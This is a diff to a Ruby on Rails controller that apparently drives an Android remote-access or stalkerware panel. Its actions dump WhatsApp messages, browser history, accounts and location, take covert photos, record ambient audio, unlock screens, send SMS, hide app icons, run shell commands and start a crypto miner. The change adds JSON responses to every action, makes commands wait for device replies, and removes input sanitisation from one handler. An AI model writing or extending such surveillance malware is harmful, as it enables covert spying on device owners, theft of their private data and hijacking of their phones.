@@ -5,29 +5,35 @@ class SmartphonesController < InheritedResources::Base
 
   def dump_sysinfo
     begin
-      smartphone_id = params[:smartphone_id].to_s.gsub(/[^a-zA-Z0-9_-]/, '')
-      smartphone = Smartphone.find(smartphone_id)
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      # Use get_device_info as it provides the same info and uses new protocol
+      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
       
-      # Send command via ActionCable to Android app
-      command_data = {
-        command: "get_device_info",
-        timestamp: Time.now.to_i
-      }
-      
-      ActionCable.server.broadcast(
-        "commands_#{smartphone.device_id}",
-        command_data
-      )
-      
-      commandOutput = ["Command sent to device #{smartphone.device_id}", "Waiting for response..."]
+      if pending_command.completed?
+        raw = pending_command.response_data
+        info = raw['payload'] || raw
+        commandOutput = [
+          "Brand: #{info['brand']}",
+          "Model: #{info['model']}",
+          "OS: #{info['os_version']}",
+          "SDK: #{info['sdk_version']}",
+          "Battery: #{info['battery_level']}%"
+        ]
+      else
+        commandOutput = ["Operation Failed: Device did not respond"]
+      end
     rescue => e
       Rails.logger.error("Error on dump sysinfo: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "dump_sysinfo",
-               :locals => { :commandOutput => commandOutput.map { |s| ActionController::Base.helpers.sanitize(s) } }
+               :locals => { :commandOutput => commandOutput }
       }
     end
   end
@@ -38,15 +44,16 @@ class SmartphonesController < InheritedResources::Base
       @smartphone = Smartphone.find(safe_id)
       camera_id = params[:back_camera] == "true" ? "0" : "1"
       
-      if !@smartphone.is_recording
+      cache_key = "recording_#{@smartphone.id}"
+      if !Rails.cache.read(cache_key)
         # Start camera stream
         pending_command = send_command_async(@smartphone, 'start_camera', { camera_id: camera_id })
-        @smartphone.update(is_recording: true)
+        Rails.cache.write(cache_key, true)
         commandOutput = ["Camera recording started (ID: #{camera_id})"]
       else
         # Stop camera stream
         pending_command = send_command_async(@smartphone, 'stop_camera', {})
-        @smartphone.update(is_recording: false)
+        Rails.cache.delete(cache_key)
         commandOutput = ["Camera recording stopped"]
       end
       
@@ -55,6 +62,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "webcam_record", locals: { 
@@ -86,6 +97,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "dump_wifi_info", locals: { commandOutput: commandOutput.map { |s| ActionController::Base.helpers.sanitize(s) } }
@@ -111,6 +126,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "dump_localtime", locals: { commandOutput: commandOutput }
@@ -151,6 +170,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "uninstall_app",
@@ -179,6 +202,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "list_apps", locals: { commandOutput: commandOutput }
@@ -225,6 +252,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "install_apk", locals: { commandOutput: commandOutput }
@@ -255,6 +286,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "run_app", locals: { commandOutput: commandOutput }
@@ -290,6 +325,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "send_sms", locals: { commandOutput: commandOutput }
@@ -315,6 +354,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "screen_unlock", locals: { commandOutput: commandOutput }
@@ -341,6 +384,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "hide_app_icon", locals: { commandOutput: commandOutput }
@@ -367,6 +414,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "show_app_icon", locals: { commandOutput: commandOutput }
@@ -397,6 +448,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "set_audio_mode", locals: { commandOutput: commandOutput }
@@ -416,6 +471,10 @@ class SmartphonesController < InheritedResources::Base
     rescue => e
       Rails.logger.error("Error uploading file: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    if want_json?
+      render json: { output: commandOutput }
+      return
     end
     respond_to do |format|
       format.js {
@@ -440,6 +499,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "wake_lock", locals: { commandOutput: commandOutput }
@@ -466,6 +529,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "run_shell_command", locals: { commandOutput: commandOutput }
@@ -495,6 +562,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "open_app", locals: { commandOutput: commandOutput }
@@ -518,6 +589,10 @@ class SmartphonesController < InheritedResources::Base
         
         unless resolved_path && allowed_dirs.any? { |dir| resolved_path.start_with?(dir) }
           commandOutput = ["Error: Invalid file path - access denied"]
+          if want_json?
+            render json: { output: commandOutput }
+            return
+          end
           respond_to do |format|
             format.js { render "install_app", locals: { commandOutput: commandOutput } }
           end
@@ -547,6 +622,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "install_app", locals: { commandOutput: commandOutput }
@@ -556,23 +635,28 @@ class SmartphonesController < InheritedResources::Base
 
   def get_accounts
     begin
-      smartphone = Smartphone.find(params[:smartphone_id])
+      @smartphone = Smartphone.find(params[:smartphone_id])
       
-      # Send command via ActionCable to Android app
-      command_data = {
-        command: "get_accounts",
-        timestamp: Time.now.to_i
-      }
+      pending_command = send_command_and_wait(@smartphone, 'get_accounts', {}, timeout: 30.seconds)
       
-      ActionCable.server.broadcast(
-        "commands_#{smartphone.device_id}",
-        command_data
-      )
-      
-      commandOutput = ["Get accounts command sent to device #{smartphone.device_id}", "Waiting for response..."]
+      if pending_command.completed?
+        accounts = pending_command.response_data['accounts'] || []
+        if accounts.any?
+          commandOutput = accounts.map { |acc| "#{acc['name']} (#{acc['type']})" }
+        else
+          error = pending_command.response_data['error']
+          commandOutput = error ? ["Error: #{error}"] : ["No accounts found"]
+        end
+      else
+        commandOutput = ["Operation Failed: Device did not respond"]
+      end
     rescue => e
       Rails.logger.error("[SmartphonesController] get_accounts failed: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    if want_json?
+      render json: { output: commandOutput }
+      return
     end
     respond_to do |format|
       format.js {
@@ -601,6 +685,10 @@ class SmartphonesController < InheritedResources::Base
     rescue => e
       Rails.logger.error("[SmartphonesController] toggle_wifi failed: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    if want_json?
+      render json: { output: commandOutput }
+      return
     end
     respond_to do |format|
       format.js {
@@ -631,12 +719,14 @@ class SmartphonesController < InheritedResources::Base
       Rails.logger.error("Error dumping device info: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "dump_device_info", locals: { commandOutput: commandOutput }
       }
-      format.json { render json: { output: commandOutput } }
-      format.any { render json: { output: commandOutput } }
     end
   end
 
@@ -653,6 +743,10 @@ class SmartphonesController < InheritedResources::Base
     rescue => e
       Rails.logger.error("Error pulling file: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    if want_json?
+      render json: { output: commandOutput }
+      return
     end
     respond_to do |format|
       format.js {
@@ -677,6 +771,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "hide_app", locals: { commandOutput: commandOutput }
@@ -700,6 +798,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "show_app", locals: { commandOutput: commandOutput }
@@ -733,6 +835,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "crypto_minner", locals: { commandOutput: commandOutput }
@@ -796,6 +902,10 @@ class SmartphonesController < InheritedResources::Base
       Rails.logger.error("Error taking picture: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js { render "take_picture", locals: { commandOutput: commandOutput } }
     end
@@ -833,6 +943,10 @@ class SmartphonesController < InheritedResources::Base
       Rails.logger.error("Error taking front camera snap: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js { render "front_camera_snap", locals: { commandOutput: commandOutput } }
     end
@@ -852,6 +966,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "check_root", locals: { commandOutput: commandOutput }
@@ -875,6 +993,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "interval_geolocate", locals: { commandOutput: commandOutput }
@@ -897,6 +1019,10 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js {
         render "dump_whatsapp_messages", locals: { commandOutput: commandOutput }
@@ -923,6 +1049,10 @@ class SmartphonesController < InheritedResources::Base
     rescue => e
       commandOutput = ["Operation Failed: #{e.message}"]
     end
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js { render "ambient_record", locals: { commandOutput: commandOutput } }
     end
@@ -940,6 +1070,10 @@ class SmartphonesController < InheritedResources::Base
     rescue => e
       commandOutput = ["Error: #{e.message}"]
     end
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
       format.js { render "browse_files", locals: { commandOutput: commandOutput } }
     end
@@ -947,14 +1081,22 @@ class SmartphonesController < InheritedResources::Base
 
   def get_app_usage
     begin
-      smartphone = Smartphone.find(params[:smartphone_id])
-      ActionCable.server.broadcast(
-        "commands_#{smartphone.device_id}",
-        { command: "get_app_usage", timestamp: Time.now.to_i }
-      )
-      commandOutput = ["📊 Collecting app usage from #{smartphone.name}"]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      pending_command = send_command_and_wait(@smartphone, 'get_app_usage', {}, timeout: 5.seconds)
+      
+      if pending_command.completed?
+        status = pending_command.response_data['status']
+        commandOutput = ["📊 App usage collection started (Status: #{status})", "Check 'App Usage' section later."]
+      else
+        commandOutput = ["Operation Failed: Device did not respond"]
+      end
     rescue => e
+      Rails.logger.error("Error getting app usage: #{e.message}")
       commandOutput = ["Error: #{e.message}"]
+    end
+    if want_json?
+      render json: { output: commandOutput }
+      return
     end
     respond_to do |format|
       format.js { render "get_app_usage", locals: { commandOutput: commandOutput } }
@@ -963,14 +1105,22 @@ class SmartphonesController < InheritedResources::Base
 
   def get_browser_history
     begin
-      smartphone = Smartphone.find(params[:smartphone_id])
-      ActionCable.server.broadcast(
-        "commands_#{smartphone.device_id}",
-        { command: "get_browser_history", timestamp: Time.now.to_i }
-      )
-      commandOutput = ["🌐 Collecting browser history from #{smartphone.name}"]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      pending_command = send_command_and_wait(@smartphone, 'get_browser_history', {}, timeout: 5.seconds)
+      
+      if pending_command.completed?
+        status = pending_command.response_data['status']
+        commandOutput = ["🌐 Browser history collection started (Status: #{status})", "Check 'Browser History' section later."]
+      else
+        commandOutput = ["Operation Failed: Device did not respond"]
+      end
     rescue => e
+      Rails.logger.error("Error getting browser history: #{e.message}")
       commandOutput = ["Error: #{e.message}"]
+    end
+    if want_json?
+      render json: { output: commandOutput }
+      return
     end
     respond_to do |format|
       format.js { render "get_browser_history", locals: { commandOutput: commandOutput } }
@@ -996,12 +1146,20 @@ class SmartphonesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
 
+    if want_json?
+      render json: { output: commandOutput }
+      return
+    end
     respond_to do |format|
-      format.js { render "start_webrtc_stream", locals: { commandOutput: commandOutput } }
+      format.js { render "start_webrtc_stream", locals: { commandOutput: commandOutput, smartphone: @smartphone } }
     end
   end
 
   private
+
+  def want_json?
+    request.format.json? || request.headers['Accept']&.include?('application/json')
+  end
 
   def smartphone_params
     params.require(:smartphone).permit(:operating_system,
